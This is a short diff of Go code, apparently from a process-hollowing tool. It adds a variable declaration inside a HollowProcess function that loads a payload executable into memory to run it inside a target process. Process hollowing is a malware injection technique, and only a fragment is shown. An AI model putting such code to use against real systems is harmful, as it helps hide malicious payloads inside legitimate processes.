@@ -14,6 +14,7 @@ func HollowProcess(payloadPath, targetPath string, arguments string, payloadByte
 	//1. Load the payload:
 	var payloadImageSize uint64
 	// Load the current executable from the file with the help of libpeconv:
+	loadedPE := uintptr(0)
 	if payloadPath == "" {
 		loadedPE = LoadPeModuleInMemory(payloadByte, &payloadImageSize)
 	} else {
